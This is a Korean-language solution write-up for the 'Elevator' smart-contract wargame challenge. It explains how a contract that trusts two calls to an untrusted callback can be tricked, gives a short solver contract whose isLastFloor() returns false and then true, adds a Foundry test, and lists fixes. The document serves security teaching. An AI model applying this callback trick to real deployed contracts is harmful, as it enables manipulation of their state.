# 11. Elevator

[English](../en/11_Elevator.md) | [한국어](11_Elevator.md)

## 문제 목표

`Elevator.top()`을 `true`로 만들어 최상층에 도달합니다.

## 핵심 개념

- 콜백 신뢰 경계
- 변경 가능한 반환값
- 반복되는 외부 호출
- 상태에 따라 달라지는 인터페이스
- 일관성 검증

## 컨트랙트 분석

`goTo()`는 `msg.sender`를 `Building`으로 취급하고 같은 질문을 두 번 호출합니다.

```solidity
function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
        floor = _floor;
        top = building.isLastFloor(floor);
    }
}
```

첫 번째 콜백이 `false`를 반환해야 `if` 블록에 들어갑니다. 두 번째 콜백은 `true`를 반환해야 `top`에 `true`가 저장됩니다. 대상은 같은 층에 대한 답이 항상 동일해야 한다는 조건을 강제하지 않습니다.

## 콜백의 답이 달라질 수 있는 이유

외부 호출은 다른 컨트랙트의 코드로 실행 제어권을 전달합니다. 대상이 받는 값은 변하지 않는 사실이 아니라 콜백 컨트랙트가 그 시점에 선택한 반환값입니다.

`isLastFloor()`는 `view` 함수가 아니므로 호출 사이에 상태를 바꿀 수 있습니다. 솔버는 `nextAnswer = true`에서 시작해 값을 반환하기 전에 매번 반전합니다.

```text
초기 상태: nextAnswer = true
첫 번째 콜백: 반전 → false, false 반환
두 번째 콜백: 반전 → true,  true 반환
```

따라서 같은 입력으로 대상이 요구하는 두 가지 답을 순서대로 만들 수 있습니다.

## 솔버 컨트랙트

```solidity
function isLastFloor(uint256) external returns (bool) {
    nextAnswer = !nextAnswer;
    return nextAnswer;
}

function solve(address target) external {
    IElevator(target).goTo(10);
}
```

요청하는 층 번호 자체보다 두 콜백의 반환 순서가 중요합니다.

## 풀이 흐름

```text
플레이어가 ElevatorSolver.solve() 호출
        ↓
솔버가 Elevator.goTo(10) 호출
        ↓
Elevator가 solver.isLastFloor(10) 호출
        ↓
솔버가 false 반환
        ↓
Elevator가 floor = 10 기록
        ↓
Elevator가 solver.isLastFloor(10)을 다시 호출
        ↓
솔버가 true 반환
        ↓
Elevator가 top = true 기록
```

## Foundry 테스트

테스트는 초기 상태와 최종 상태를 모두 검증합니다.

```solidity
assertFalse(target.top());
assertEq(target.floor(), 0);

vm.prank(player);
solver.solve(address(target));

assertTrue(target.top());
assertEq(target.floor(), 10);
```

## 문제의 근본 원인

대상은 신뢰할 수 없는 콜백이 두 번의 독립된 호출에서 일관된 답을 반환할 것이라고 가정합니다. EVM이나 인터페이스는 이러한 일관성을 보장하지 않습니다.

## 권장 개선 방법

- 외부 데이터 제공자는 한 번만 호출하고 반환값을 지역 변수에 저장합니다.
- 반복 콜백을 무결성 검사로 사용하지 않습니다.
- 모든 외부 콜백은 상태에 따라 결과가 달라질 수 있다고 가정합니다.
- 읽기 전용 인터페이스는 적절한 경우 `view`로 선언하되 불필요한 반복 호출은 피합니다.
- 중요한 상태 결정은 호출자에게 위임하지 말고 신뢰할 수 있는 상태 머신 내부에서 처리합니다.

## 테스트 실행

```bash
forge test --match-path test/11_Elevator.t.sol -vvv
```

## 학습 정리

같은 인수로 두 번 호출해도 같은 값이 반환된다는 보장은 없습니다. 컨트랙트 경계를 넘어간 순간 반환값은 신뢰할 수 없는 외부 상태로 다뤄야 합니다.
